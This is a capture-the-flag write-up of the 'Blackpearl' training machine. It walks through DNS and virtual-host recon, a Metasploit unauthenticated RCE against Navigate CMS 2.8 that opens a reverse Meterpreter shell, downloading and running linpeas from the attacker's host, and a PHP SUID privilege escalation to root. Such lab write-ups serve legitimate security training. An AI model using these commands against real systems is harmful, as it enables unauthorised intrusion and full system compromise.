
# Blackpearl — TCM Security PEH Capstone

**By Stager**  | FashilHack

---
## What this machine is about

Blackpearl teaches one thing specifically: Virtual Host Routing. The flag literally tells you this at the end. A single IP, multiple sites, and the only way to reach the right one is knowing the domain name. If you enumerate properly you find it. If you don't — you're stuck looking at an nginx default page the entire time wondering what you're missing.

## Target

```
IP:     172.20.10.4
Domain: blackpearl.tcm (discovered during recon)
OS:     Debian Linux
```

---

## Step 1 — Nmap

```bash
nmap -p- -A -T4 172.20.10.4
```

Three ports:

|Port|Service|
|---|---|
|22|SSH — OpenSSH 7.9p1|
|53|DNS — ISC BIND 9.11.5|
|80|HTTP — nginx 1.14.2|

![[stager/writeups/blackpearl/images/nmap dirbuster.png]]

Port 53 is the important one. A DNS service on a lab machine almost always means there's a domain name to find. I noted it and moved to the web first.

Port 80 gave me the nginx default page. I ran Gobuster immediately:

```bash
gobuster dir -u http://172.20.10.4 -w big.txt -x php,html,txt
```

Found `/secret` (200) — nothing else useful on the IP. That told don't focus on fuzzing look anywhere else.


---

## Step 2 — Source Code

Before touching DNS I checked the page source of the nginx default page. Good habit — developers leave things in HTML comments.

Line 25:

```html
<!-- Webmaster: alek@blackpearl.tcm -->
```

There it is. Domain: `blackpearl.tcm`. Username: `alek`. Both noted.
![[stager/writeups/blackpearl/images/found user in sourcecode.png]]

---

## Step 3 — DNS Enumeration

Port 53 is open — the machine runs its own DNS server. I queried it with a reverse lookup:

```bash
dnsrecon -r 127.0.0.0/24 -n 172.20.10.4 -d black
```

**What this command does:**
- `-n 172.20.10.4` — asks the machine's own DNS server
- `-r 127.0.0.0/24` — asks it to reverse-resolve every IP in the 127.0.0.x range
- The machine maps its own domain to localhost (127.0.0.1) internally — so the answer comes back from the loopback range, not from its external IP

Result:

```
[+] PTR blackpearl.tcm 127.0.0.1
[+] 1 Records Found
```

Confirmed. Added to `/etc/hosts`:

```bash
sudo nano /etc/hosts
# 172.20.10.4    blackpearl.tcm
```

**Why this matters:** Without this line, my browser and tools send requests with `Host: 172.20.10.4` — nginx returns the default page. With this line, they send `Host: blackpearl.tcm` — nginx routes to the real application. That's virtual host routing in one sentence.
![[stager/writeups/blackpearl/images/checked dns ip to domain blackpearl.tcm in hosts.png]]

---

## Step 4 — Gobuster on the Domain

Now with the domain in `/etc/hosts`, ran Gobuster again — this time against `blackpearl.tcm`:

```bash
gobuster dir -u http://blackpearl.tcm/ -w big.txt -x php,html,txt
```

Found `/navigate` (301). The same tool, the same IP, completely different results — because now the Host header is right.
![[stager/writeups/blackpearl/images/did disbuster to new domain found navigate.png]]

---

## Step 5 — Navigate CMS

Went to `http://blackpearl.tcm/navigate/login.php` — Navigate CMS login page. Version 2.8 visible bottom right.

Searched for exploits: **Navigate CMS 2.8 Unauthenticated RCE** — Metasploit module available. No credentials needed.
![[stager/writeups/blackpearl/images/found login.png]]

---

## Step 6 — Metasploit — Navigate CMS RCE

```bash
msfconsole
use exploit/multi/http/navigate_cms_rce
set RHOSTS 172.20.10.4
set LHOST 172.20.10.2
set LPORT 3333
set vhost blackpearl.tcm    # critical — without this it hits the wrong site
exploit
```

Output:

```
[+] Login bypass successful
[+] Upload successful
[+] Meterpreter session 1 opened
```

Dropped into shell:

```bash
shell
whoami
# www-data
```

Low-privilege shell. The `vhost` option is easy to forget — if you skip it, the exploit hits the nginx default page and fails. Always set it when the target runs virtual hosts.
![[stager/writeups/blackpearl/images/got a shell after exploit navigate cms and bypass authenticaion.png]]

---

## Step 7 — Linpeas

Hosted linpeas from Kali, pulled it to the target:

```bash
# Kali:
python3 -m http.server 80

# Target:
cd /tmp
wget http://172.20.10.2/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

SUID section — one line in red:

```
-rwsr-xr-x 1 root root 4.6M /usr/bin/php7.3  (Unknown SUID binary!)
```

php7.3 owned by root with the SUID bit. That means any user who runs it gets root's effective UID. GTFOBins has the exact command.
![[stager/writeups/blackpearl/images/runned linpeas.png]]

---

## Step 8 — SUID → Root

Confirmed it manually:

```bash
find / -perm -u=s -type f 2>/dev/null
# /usr/bin/php7.3 in the list
```

GTFOBins — PHP SUID entry:

```bash
/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
```

The `-p` flag is what makes it work. It tells the shell to preserve the effective UID — which is 0 (root) because of the SUID bit. Without `-p`, the shell drops privileges and you stay as www-data.

```bash
id
# uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)

cd /root
cat flag.txt
# Good job on this one.
# Finding the domain name may have been a little guessy,
# but the goal of this box is mainly to teach about Virtual Host Routing
# which is used in a lot of CTF.
```

Done.

![[stager/writeups/blackpearl/images/esclated to root by running a root file us low user.png]]

---

## The Full Chain

```
Nmap → port 53 open (DNS)
    ↓
Source code → alek@blackpearl.tcm comment
    ↓
dnsrecon on port 53 → PTR confirms blackpearl.tcm
    ↓
/etc/hosts → 172.20.10.4 blackpearl.tcm
    ↓
Gobuster on domain → /navigate (Navigate CMS 2.8)
    ↓
Metasploit navigate_cms_rce (vhost = blackpearl.tcm) → www-data
    ↓
linpeas → php7.3 SUID (root owned)
    ↓
pcntl_exec('/bin/sh', ['-p']) → euid=0(root)
    ↓
/root/flag.txt
```

---

## What I took from this

**Source code is recon.** The domain was sitting in an HTML comment. Most people look at the rendered page and miss it. View source is a habit worth building.

**Port 53 always means something.** DNS on a lab machine is not decoration. Query it. Do a reverse lookup. Do a zone transfer attempt. The answer you need is usually there.

**Virtual host routing is everywhere.** This shows up constantly in CTFs and in real assessments. One IP, many sites. The domain unlocks them. If Gobuster on an IP gives you almost nothing — there's probably a virtual host you haven't found yet.

**The `-p` flag on SUID shells.** Small detail, big difference. Without it you drop privileges. With it you keep euid=0. GTFOBins always shows the right flags — read it carefully, don't just copy the first command you see.

---

_Stager — PNPT Candidate_ _FashilHack — Simulating Attacks, Securing Businesses._